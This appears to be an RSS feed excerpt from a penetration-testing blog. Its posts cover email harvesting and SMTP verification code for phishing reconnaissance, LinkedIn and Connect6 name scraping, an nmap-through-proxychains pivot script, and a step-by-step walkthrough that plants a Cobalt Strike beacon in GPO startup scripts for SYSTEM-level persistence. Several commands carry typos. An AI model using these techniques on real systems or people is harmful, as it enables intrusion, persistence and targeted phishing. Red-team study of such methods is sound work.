&lt;p&gt;&lt;a href=&#34;https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf&#34;&gt;https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Dylib Hijacks-&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&#34;&gt;https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Email Verification and Email Name Creation</title>
      <link>https://cybersyndicates.com/2016/02/email-harvesting-and-name-creation/</link>
      <pubDate>Sun, 14 Feb 2016 14:23:45 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2016/02/email-harvesting-and-name-creation/</guid>
      <description>

&lt;p&gt;Over the past few months we have been rapidly expanding the capability of SimplyEmail. While it is a very simple tool, it has been extremely successful on a few live engagements I have been on. I feel like it is ready for recommendation to say the least. I did however notice a few key features that some of the guys on the team mentioned that would be nice to have integrated. Thanks to &lt;a href=&#34;https://twitter.com/_wald0&#34;&gt;@_wald0&lt;/a&gt; and his suggestions I have implemented a email verification option. Also I learned a trick or so a few months back from &lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;@harmj0y&lt;/a&gt; on sick site called &amp;ldquo;Connect6&amp;rdquo;, which seems to populate a large name DB of employees for each company. Also a fellow tester and friend (&lt;a href=&#34;https://twitter.com/nagasecurity&#34;&gt;Joshua Crumbaugh&lt;/a&gt;) let me on to a sick tool for grabbing Linkedin names from bing called &lt;a href=&#34;https://github.com/pan0pt1c0n/PhishBait&#34;&gt;PhishBait&lt;/a&gt;. With all this I set out to build some new capabilities for SimplyEmail and learn some new tricks :)&lt;/p&gt;

&lt;p&gt;TL;DR:
&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/SimplyEmail&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h4 id=&#34;smtp-email-verification&#34;&gt;SMTP Email Verification&lt;/h4&gt;

&lt;p&gt;This process is actually relatively easy to accomplish. Its a simple heuristic of SMTP return codes when attempting to send a email on the target SMTP server. The process takes place by first Identifying the proper MX record to point to. In many cases larger corporations will have more than one SMTP server with multiple MX records. These are for redundancy of course and are ordered by priority, here is a small snip of the code I built fast:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    def GetMX(self):
      MXRecord = [] 
      try:
        if self.verbose:
          print helpers.color(&#39; [*] Attempting to resolve MX records!&#39;, firewall=True)
        answers = dns.resolver.query(self.domain, &#39;MX&#39;)
        for rdata in answers:
          data = {
            &amp;quot;Host&amp;quot;: str(rdata.exchange),
            &amp;quot;Pref&amp;quot;: int(rdata.preference),
          }
          MXRecord.append(data)
        # Now find the lowest value in the pref
        Newlist = sorted(MXRecord, key=lambda k: k[&#39;Pref&#39;]) 
        # Set the MX record
        self.mxhost = Newlist[0]
        if self.verbose:
          val = &#39; [*] MX Host: &#39; + str(self.mxhost[&#39;Host&#39;])
          print helpers.color(val, firewall=True)
      except Exception as e:
        error = &#39; [!] Failed to get MX record: &#39; + str(e)
        print helpers.color(error, warning=True)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After obtaining all the MX records we can easily sort, pick the lowest value and feed it to the next function needed. So here is the meat of the verification checks. Before we go ahead and send the SMTP server all of the gathered emails we need to check if this SMTP server supports this. We do this via providing the STMP server a known &amp;ldquo;invalid&amp;rdquo; address, and we test for the a return code other than 250 (250 is a valid email code). If we get anything except a 250, we know that the SMTP server isn&amp;rsquo;t just returning a 250 for each address supplied. we can test this pretty simply:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; def VerifySMTPServer(self):
      &#39;&#39;&#39;
      Checks for code other than 250 for crap email.
      &#39;&#39;&#39;
      # Idea from:
      # https://www.scottbrady91.com/Email-Verification/Python-Email-Verification-Script
      hostname = socket.gethostname()
      socket.setdefaulttimeout(10)
      server = smtplib.SMTP(timeout=10)
      server.set_debuglevel(0)
      addressToVerify = &amp;quot;There.Is.Knowwaythiswillwork1234567@&amp;quot; + str(self.domain)
      try:
        server.connect(self.mxhost[&#39;Host&#39;])
        server.helo(hostname)
        server.mail(&#39;email@gmail.com&#39;)
        code, message = server.rcpt(str(addressToVerify))
        server.quit()
        if code == 250:
          return False
        else: 
          return True
      except Exception as e:
        print e
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So lets say our SMTP server supports this type of check, we can simply build a function to perform the check for our gathered emails. Here is a small small output of it in action:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-02-14-at-11.10.11-AM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-02-14-at-11.10.11-AM.png&#34; alt=&#34;Screen Shot 2016-02-14 at 11.10.11 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Obviously I needed to wrap this in a simple helper class for SimplyEmail, the full code (Class) can be found here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/VerifyEmails.py&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/VerifyEmails.py&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;connect6-name-creation&#34;&gt;Connect6 Name Creation&lt;/h4&gt;

&lt;p&gt;Im always extreamly nervous to add in functionality to SimpleEmail.. hence the name! In some cases name creation can be a pivotal and vital addition to your phishing campaigns. Some times SimplyEmail will only find the standard email addresses or just a few emails. In this case email creation may be your saving grace. On my assessments I with out doubt found Connect6.com is a reliable source to gather names associated with companies.&lt;/p&gt;

&lt;p&gt;Too start I throughly attempted to find  way to get the Connect6 URL using their search engine, with no anvil. This may be do to how they want you to pay for their service / API. So I did build a simple Google Dork function to attempt to resolve the correct URL:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    def Connect6AutoUrl(self):
      # Using startpage to attempt to get the URL
      # https://www.google.com/search?q=site:connect6.com+domain.com
      try:
        # This returns a JSON object
        urllist = []
        url = &amp;quot;https://www.google.com/search?q=site:connect6.com+%22&amp;quot; + self.domain + &#39;%22&#39;
        r = requests.get(url, headers=self.UserAgent)
      except Exception as e:
        error = &amp;quot;[!] Major issue with Google Search: for Connect6 URL&amp;quot; + str(e)
        print helpers.color(error, warning=True)
      try:
        RawHtml = r.content
        soup = BeautifulSoup(RawHtml)
        for a in soup.findAll(&#39;a&#39;, href=True):
          try:
            l = urlparse.parse_qs(urlparse.urlparse(a[&#39;href&#39;]).query)[&#39;q&#39;]
            if &#39;site:connect6.com&#39; not in l[0]:
              l = l[0].split(&amp;quot;:&amp;quot;)
              urllist.append(l[2])
          except:
            pass
        return urllist
      except Exception as e:
        print e
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Full code can be found here: &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/Connect6.py&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/Connect6.py&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here is a quick sample of the output that you will given if it cant detect the correct URL:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-02-14-at-11.20.14-AM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-02-14-at-11.20.14-AM.png&#34; alt=&#34;Screen Shot 2016-02-14 at 11.20.14 AM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;linkedin-name-creation&#34;&gt;LinkedIn Name Creation&lt;/h4&gt;

&lt;p&gt;Linkedin is and has been know as a great source for social engineering, and recently I first hand got to see how effective it is to build a email campaign of it. Using the PhishBait tool mention earlier I was able to add in additional functionality and build in LinkedIn name scraping into SimplyEmail. Here is the really simple code I adapted:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def LinkedInNames(self):
      &#39;&#39;&#39;
      This function simply uses
      Bing to scrape for names and
      returns a list of list names.
      &#39;&#39;&#39;
      try:
        br = mechanize.Browser()
        br.set_handle_robots(False)
        self.domain = self.domain.split(&#39;.&#39;)
        self.domain = self.domain[0]
        r = br.open(&#39;http://www.bing.com/search?q=(site%3A%22www.linkedin.com%2Fin%2F%22%20OR%20site%3A%22www.linkedin.com%2Fpub%2F%22)%20%26%26%20(NOT%20site%3A%22www.linkedin.com%2Fpub%2Fdir%2F%22)%20%26%26%20%22&#39;+self.domain+&#39;%22&amp;amp;qs=n&amp;amp;form=QBRE&amp;amp;pq=(site%3A%22www.linkedin.com%2Fin%2F%22%20or%20site%3A%22www.linkedin.com%2Fpub%2F%22)%20%26%26%20(not%20site%3A%22www.linkedin.com%2Fpub%2Fdir%2F%22)%20%26%26%20%22&#39;+self.domain+&#39;%22&#39;)
        soup = BeautifulSoup(r)
        if soup:
          link_list = []
          NameList = []
          more_records = True
          Round = False
          while more_records:
            if Round:
              response = br.follow_link(text=&amp;quot;Next&amp;quot;)
              soup = BeautifulSoup(response)
            # enter this loop to parse all results
            # also follow any seondary links
            for definition in soup.findAll(&#39;h2&#39;):
              definition = definition.renderContents()
              if &amp;quot;LinkedIn&amp;quot; in definition:
                name = (((((definition.replace(&#39;&amp;lt;strong&amp;gt;&#39;,&#39;&#39;)).replace(&#39;&amp;lt;/strong&amp;gt;&#39;,&#39;&#39;)).split(&#39;&amp;gt;&#39;)[1]).split(&#39;|&#39;)[0]).rstrip()).split(&#39;,&#39;)[0]
                name = name.split(&#39; &#39;)
                if self.verbose:
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally the full code can found here: &lt;a href=&#34;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/LinkedinNames.py&#34;&gt;https://github.com/killswitch-GUI/SimplyEmail/blob/master/Helpers/LinkedinNames.py&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>SYSTEM Context Persistence in GPO Startup Scripts</title>
      <link>https://cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/</link>
      <pubDate>Mon, 25 Jan 2016 04:32:51 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2016/01/system-context-persistence-in-gpo-startup/</guid>
      <description>&lt;p&gt;Interesting enough I was recently experimenting on GPO settings to configure my Applocker for testing and came by Scripts under the (Computer Configuration) settings for GPO. This defiantly caught my attention, since persistence is a cat and mouse game of stored locations / methods. &lt;strong&gt;This has been mentioned but I haven&amp;rsquo;t seen it talked about so hey why not share what I did&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.36.07-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.36.07-PM.png&#34; alt=&#34;Screen Shot 2016-01-24 at 10.36.07 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I knew I wanted to weaponize it from a pure command line standpoint as the configuration utility is pretty much point and click. Some of the assumptions are:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;You have already elevated or have Local Admin context on the box&lt;/li&gt;
&lt;li&gt;Have the ability to upload a file in your agent (CobaltStike) / Have a Deployable .BAT/PS script&lt;/li&gt;
&lt;li&gt;Willing to drop something to disk for persistence&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.41.18-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-10.41.18-PM.png&#34; alt=&#34;Screen Shot 2016-01-24 at 10.41.18 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;While that GUI looks quite simple and easy to use, that would be to dang easy! Lets get started:&lt;/p&gt;

&lt;p&gt;The current process I use to deploy a CS Fully Staged Beacon:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Enumerate current GPO scripts&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Remove the psscripts.ini&lt;/li&gt;
&lt;li&gt;Upload a new psscripts.ini&lt;/li&gt;
&lt;li&gt;Upload the Beacon.ps1 scripts&lt;/li&gt;
&lt;li&gt;conduct a Gpupdate&lt;/li&gt;
&lt;li&gt;On restart you should get a beacon!&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The location of interest (while this seems trivial, do to the permissions on this directory you will have to force all commands):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Enumerate the Dir (See if a scripts.ini is built):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;beacon&amp;gt; powershell Get-ChildItem -Force C:\Windows\System32\GroupPolicy\Machine\Scripts\
[*] Tasked beacon to run: Get-ChildItem -Force C:\Windows\System32\GroupPolicy\Machine\Scripts\
[+] host called home, sent: 77 bytes
[+] received output:
 Directory: C:\Windows\System32\GroupPolicy\Machine\Scripts
Mode LastWriteTime Length Name 
---- ------------- ------ ---- 
d---- 10/15/2015 6:36 PM Shutdown 
d---- 1/24/2016 5:57 PM Startup 
-a-h- 1/24/2016 5:28 PM 184 psscripts.ini
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Enumerate to see the current scripts in-play:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell type C:\Windows\System32\GroupPolicy\Machine\Scripts\psscripts.ini
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you will noticed the structure goes (the 0Cmd.. is incremental):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[ScriptsConfig]
StartExecutePSFirst=true
[Startup]
0CmdLine=beacon2.ps1
0Parameters=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Simply copy this data and save it locally in a text editor and add in you PS agent name. Once you have completed this go ahead and upload to the target. A side note on this, something extremely weird happens when trying to use the built in shell / ls / cd within CS beacons. While this was a pain, I just resorted to using PS for most of it.&lt;/p&gt;

&lt;p&gt;Go ahead and delete the original psscripts.ini:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell Remove-Item -Force C:\Windo0ws\System32\GroupPolicy\Machine\Scripts\psscripts.ini
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After uploading the script to the C:\ drive (In my case I no ability to upload directly to the location):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell Move-Item -force -path C:\psscripts.ini -destination C:\Windows\System32\GroupPolicy\Machine\Scripts\
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally using CS Beacons Stageless PowerShel script I moved that to the required location:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;powershell Move-Item -force -path C:\beacon2.ps1 -destination C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup

gpupdatep /force
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally on reboot you should have a callback! :)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-11.25.47-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2016-01-24-at-11.25.47-PM.png&#34; alt=&#34;Screen Shot 2016-01-24 at 11.25.47 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To wrap up this seems like a great SYSTEM level call back and the cool part is you can add in parameters for custom payloads. Ex. if you wanted to only start at certain time you could pass the time or date that would like to restrict or even extend. This method seems extremely strong and has proved to be reliable method. Soon to come is the CS aggressor script and PS script to automate this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Scanning Effectively Through a SOCKS Pivot with Nmap and Proxychains</title>
      <link>https://cybersyndicates.com/2015/12/nmap-and-proxychains-scanning-through-a-socks-piviot/</link>
      <pubDate>Sun, 13 Dec 2015 19:14:20 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2015/12/nmap-and-proxychains-scanning-through-a-socks-piviot/</guid>
      <description>

&lt;p&gt;When ever I am on a pen-test and I come across a major problem (Every OP) that requires some creative solution and I love to share it. Not only that I could help someone else one day, but it really helps me retain the knowledge for future use.&lt;/p&gt;

&lt;p&gt;This past engagement we where on a very unique network dealing with ICS devices and a ton of Unix backend servers, while still handling our normal pen test methodology on the side (No Time to play). While I feel comfortable operating in most network environments, *NIX based environments generally pose to elevate the difficulty of lateral movement and achieving final end state goals of the OP. In this environment most of the critical assets we where targeting where properly VLAN’ed off and proper network segmentation was in place.&lt;/p&gt;

&lt;p&gt;After initial host discovery, we noticed our active host count was low and we figured we needed to gain a foothold on a dual homed box. Gaining a foothold didn’t take long on a lovely Unix jump box. After confirming we could hit multiple VLANs and a known target, it was time to re-scan for our initial host discovery.&lt;/p&gt;

&lt;p&gt;In the past I have played around with getting Nmap to scan through Tor, and there are plenty of those tutorials on the web. But this time I had to perform a larger scan of multiple IP’s (/16) for an initial host discovery. I knew I could use the Unix jump box as a SOCKS4/5 proxy to funnel all my scan data through using SSH without dropping anything to disk.&lt;/p&gt;

&lt;p&gt;Here is the idea:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-5.42.29-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-5.42.29-PM.png&#34; alt=&#34;Screen Shot 2015-12-11 at 5.42.29 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The first step is to setup your SSH SOCKS Proxy:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ssh -DnF 8080 user@jump-box
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After that was setup I had to configure ProxyChains:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.47.24-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.47.24-PM.png&#34; alt=&#34;Screen Shot 2015-12-11 at 6.47.24 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Turn on Quite mode for ProxyChains&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.48.36-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.48.36-PM.png&#34; alt=&#34;Screen Shot 2015-12-11 at 6.48.36 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As we move forward we will discover the timeouts section will have to be tinkered with. This is key to optimizing your performance with Nmap.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.55.59-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-12-11-at-6.55.59-PM.png&#34; alt=&#34;Screen Shot 2015-12-11 at 6.55.59 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lastly set up the strike chain.&lt;/p&gt;

&lt;h3 id=&#34;heart-aches-with-nmap&#34;&gt;Heart Aches with Nmap&lt;/h3&gt;

&lt;p&gt;So now we are at the main point of even writing this blog. Before when test scanning through Proxy tunnels I only did one or two address at a time. But in this case I needed to scan a large amount of IP space in a reasonable time table. In the past few months I have greatly optimized my scanning techniques to get the most out of my discovery scans. Working with a team of 3-5 can be tough with coordination and when conducting a internal pen-test I may need to get through generally entire /8 or a few /16’s. In this case I had a potential /16 behind my jump box.&lt;/p&gt;

&lt;p&gt;So after following my SOP’s I noticed just firing off Nmap into this SOCKS proxy tunnel wasn’t going to cut it. We experienced large drops in performance and Nmap’s performance and timing parameters weren’t working correctly. Here is my standard Nmap String (Internal scan):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Nmap -Pn -n -sS –p 21-23,25,53,111,137,139,445,80,443,3389,5900,8080,8443 --min-hostgroup 255 --min-rtt-timeout 1ms --max-rtt-timeout 70ms --max-retries 0 --max-scan-delay 0 --min-rate 2000 -oA &amp;lt;customer-#&amp;gt; -vvv --open -iL &amp;lt;IPLIST&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But after 2 minutes of scanning with this I noticed a few things:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Parallel scans weren’t taking place&lt;/li&gt;
&lt;li&gt;Timing and performance aspects don’t work&lt;/li&gt;
&lt;li&gt;Nmap cant perform &amp;ndash;defeat-rst-ratelimit with full TCP Connect scans –sT&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;It would wait the full 1500ms for a port to time-out (Rmbr the Proxy config)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A ton of these problems stem from the fact that we are using a SOCKS proxy, and the nature of the connect scan. When you scan from your Kali system you perform the following Nmap -&amp;gt; Proxy-chains -&amp;gt; SOCKS (Jump Box) -&amp;gt; Target System. I discovered that even though you have all the timing settings setup Nmap is going to interpret that the Half Open connection with the SOCKS proxy as open and will let it hang till ProxyChains literally kills the connection due to a (TCP-Read-Timeout). At first I thought I could solve this issue using the &amp;ldquo;&amp;ndash;host-timeout 80ms&amp;rdquo; flag. But I discovered once that host-timeout was reached it will completely kill the connection (NMAP ADD IN A PORT TIMEOUT!).&lt;/p&gt;

&lt;p&gt;Instantly I knew I had to build out a quick script to help reduce the time it would take get through this scan. So I quickly hacked together a multi processed Python script to launch separate Proxychain / Nmap instances. This script sped up the time dramatically, and incase one process was hung the others could continue on rather than coming to a dead stop. I’m sure this could be done way better, but I thought I could atleast post what I did on the fly to speed up my scans. Also my Jump box couldn&amp;rsquo;t handle (Popen and shell=True) for the sub process call, It was going a bit too fast. Right now I used call_check and just escaped that returned data for the moment. In the coming weeks I do plan to clean up the code a bit. All in all it took some time to trouble shoot the problem and thought I would share.&lt;/p&gt;

&lt;p&gt;The script can be found here: &lt;a href=&#34;https://github.com/killswitch-GUI/PenTesting-Scripts/blob/master/Proxychains-Nmap.py&#34;&gt;https://github.com/killswitch-GUI/PenTesting-Scripts/blob/master/Proxychains-Nmap.py&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    import multiprocessing
    import argparse
    import Queue
    import threading
    import os
    import sys
    import subprocess
    from random import randint




    
    def cli_parser():
     parser = argparse.ArgumentParser(add_help=False, description=&#39;&#39;&#39;This script Simply routes your nmap scan in a &amp;quot;sort-of&amp;quot; fast way 
     through a ProcyChain that has been setup.
     \n\t(1) You will find out that when routing nmap through a Proxychain connection that Timing performace is out the window.
     \n\t(2) This is do to the nature of a SOCKS proxy and SYN-&amp;gt;SYN/ACK connection is already established in NMAPS Eyes.
     \n\t(3) It out puts random (#) of .gnmap file for each IP for parsing. (MAKE A FOLDER) :)
     &#39;&#39;&#39;)
     parser.add_argument(&amp;quot;-i&amp;quot;, metavar=&amp;quot;iplist.txt&amp;quot;, help=&amp;quot;Set Ip List of IPs Delimited by line&amp;quot;)
     parser.add_argument(&#39;-h&#39;, &#39;-?&#39;, &#39;--h&#39;, &#39;-help&#39;, &#39;--help&#39;, action=&amp;quot;store_true&amp;quot;, help=argparse.SUPPRESS)
     args = parser.parse_args()
     if args.h: 
     parser.print_help()
     sys.exit()
     if not args.i:
     print &amp;quot;[!] I need a list IP&#39;s!&amp;quot;
     sys.exit()
     return args.i




    
    def Execution(Task_queue):
     while True:
     Ip = Task_queue.get()
     # If the queue is emepty exit this proc
     # Setup a simple output in the folder, For gnmap Parser
     IpName = str(Ip).replace(&#39;.&#39;,&amp;quot;-&amp;quot;) + str(&amp;quot;.gnmap&amp;quot;)
     if Ip is None:
     break
     try:
     print &amp;quot;[*] On Ip: &amp;quot; + Ip
     test = subprocess.check_output([&amp;quot;proxychains&amp;quot;, &amp;quot;nmap&amp;quot;, &amp;quot;-Pn&amp;quot;, &amp;quot;-n&amp;quot;, &amp;quot;-sT&amp;quot;, &amp;quot;--max-scan-delay&amp;quot;, &amp;quot;0&amp;quot;, &amp;quot;-p111,445,139,21-23,80,443&amp;quot;, &amp;quot;-oG&amp;quot;, IpName, &amp;quot;--open&amp;quot;, Ip])
     test = &amp;quot;&amp;quot;
     except:
     pass




    
    def TaskSelector(Task_queue, verbose=False):
     total_proc = int(8)
     for i in xrange(total_proc):
     Task_queue.put(None)
     procs = []
     for thread in range(total_proc):
     procs.append(multiprocessing.Process(target=Execution, args=(Task_queue,)))
     for p in procs:
     p.daemon = True
     p.start()
     for p in procs:
     p.join()
     Task_queue.close()




    
    def Ip_List(Task_queue, cli_IpList):
     items = []
     cli_IpList = str(cli_IpList)
     try:
     with open(cli_IpList, &amp;quot;r&amp;quot;) as myfile:
     lines = myfile.readlines()
     for line in lines:
     line = line.rstrip(&#39;\n&#39;)
     items.append(line)
     for item in items:
     Task_queue.put(item)
     return Task_queue
     except Exception as e:
     print &amp;quot;[!] Please check your Ip List: &amp;quot; + str(e)
     sys.exit(0)




    
    def main():
     cli_IpList = cli_parser()
     Task_queue = multiprocessing.Queue()
     Task_queue = Ip_List(Task_queue, cli_IpList)
     TaskSelector(Task_queue)




    
    if __name__ == &amp;quot;__main__&amp;quot;:
     try: 
     main()
     except KeyboardInterrupt:
     print &#39;Interrupted&#39;
     try:
     sys.exit(0)
     except SystemExit:
     os._exit(0)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>SimplyEmail v0.5: PDFMiner!</title>
      <link>https://cybersyndicates.com/2015/11/simplyemail-v0-5-pdfminer/</link>
      <pubDate>Sat, 21 Nov 2015 18:32:48 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2015/11/simplyemail-v0-5-pdfminer/</guid>
      <description>

&lt;h2 id=&#34;major-addition-to-simplyemail-core&#34;&gt;Major addition to SimplyEmail Core&lt;/h2&gt;

&lt;p&gt;When I first started this project I published a pretty in-depth “path” of progression. I told my self I would be following this to help build a tool that would actually enhance and build off what is already open source. I knew I had to have unique methods and content. One thing that I use quite often is google dorking for multiple Intel gathering techniques for a OP, so I knew this had to be added!&lt;/p&gt;

&lt;p&gt;&lt;blockquote class=&#34;twitter-tweet&#34; data-lang=&#34;en&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;SimplyEmail v0.5: PDFMiner just added! Email recon with PDF scraping. &lt;a href=&#34;https://t.co/awX3eoRGNK&#34;&gt;https://t.co/awX3eoRGNK&lt;/a&gt; (or on GitHub) &lt;a href=&#34;https://t.co/JVsc7yrflE&#34;&gt;https://t.co/JVsc7yrflE&lt;/a&gt;&lt;/p&gt;&amp;mdash; Alex Rymdeko-harvey (@Killswitch_GUI) &lt;a href=&#34;https://twitter.com/Killswitch_GUI/status/668137062055452673&#34;&gt;November 21, 2015&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h3 id=&#34;intel-gathering-stage&#34;&gt;Intel Gathering Stage&lt;/h3&gt;

&lt;p&gt;During my tests I weigh heavy on open source information  to help me paint a picture of the culture and potential target rich opportunities once internal. During this stage we are often tasked to Phish external for statistics or payloads to simulate and external threat.&lt;/p&gt;

&lt;p&gt;This generally encompasses the ability to generate a custom phishing template that is somewhat unique to the target. I can sometimes locate sensitive information using the &lt;strong&gt;(site:target.com file:pdf) &lt;/strong&gt;method to gather documents they may have published. We generally gather the following information:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;CEO and main leadership&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Current issues or press releases that are related to the target&lt;/li&gt;
&lt;li&gt;What the company sells&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I take all the above into account when developing potential targeted emails. Funny enough these documents are a great source for emails as well. As they generally have contact information outside the standard &lt;a href=&#34;mailto:info@company.com&#34;&gt;info@company.com&lt;/a&gt;. This source however can be hard to gather from the HTML scrapping modules already in place. One the documents can take a good amount of time to gather, and for the sake of speed I have always found using googles indexed files always seemed to speed things up.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.13.55-PM.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/Screen-Shot-2015-11-21-at-1.13.55-PM.png&#34; alt=&#34;Screen Shot 2015-11-21 at 1.13.55 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;pdfminer&#34;&gt;PDFMiner&lt;/h3&gt;

&lt;p&gt;With some basic requirements in hand I knew I could use the previous built module to handle most of the google search requirements. I just need a few small tweaks and I could start parsing the raw HTML of google for PDF files. Using PDFMiner I was able to convert a bulk of them to Text for parsing.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.14.06-PM.png&#34;&gt;&lt;img src=&#34;http://cybersyndicates.com/wp-content/uploads/2015/11/Screen-Shot-2015-11-21-at-1.14.06-PM.png&#34; alt=&#34;Screen Shot 2015-11-21 at 1.14.06 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

